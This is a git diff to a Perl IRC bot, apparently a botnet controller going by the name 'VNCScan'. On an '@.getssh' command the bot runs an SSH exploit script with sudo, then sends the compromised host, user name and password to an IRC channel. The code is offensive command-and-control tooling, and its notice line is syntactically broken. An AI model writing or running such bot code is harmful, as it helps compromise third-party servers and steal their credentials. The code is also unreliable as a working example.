@@ -13,6 +13,9 @@ use Mojo::IOLoop;
 #definenoticechanhere
 #definechanhere
 my %events;
+my $h0st;
+my $us3r;
+my $p4ss;
 my $irc = Mojo::IRC->new(
  #definenickhere
  user => 'VNCScan',
@@ -64,9 +67,10 @@ $irc->on(irc_privmsg => sub {
   if ($msg =~ /@.getssh/) {
   system 'sudo sh sshexploit.sh';
   system 'sudo source sshexploit.sh';
-  my $h0st = $ENV{'H0ST'};
-  my $us3r = $ENV{'US3R'};
-  my $p4ss = $ENV{'P4SSWD'};
+  warn 'Getting SSH...';
+  $h0st = $ENV{'H0ST'};
+  $us3r = $ENV{'US3R'};
+  $p4ss = $ENV{'P4SSWD'};
   $irc->write(notice => $noticechan => '9,1Added user:' $misc->{us3r} 'password:' $misc->{p4ss} 'on host:'$misc->{h0st}');
  }
  elsif ($msg =~ /@.stopexploit/) {
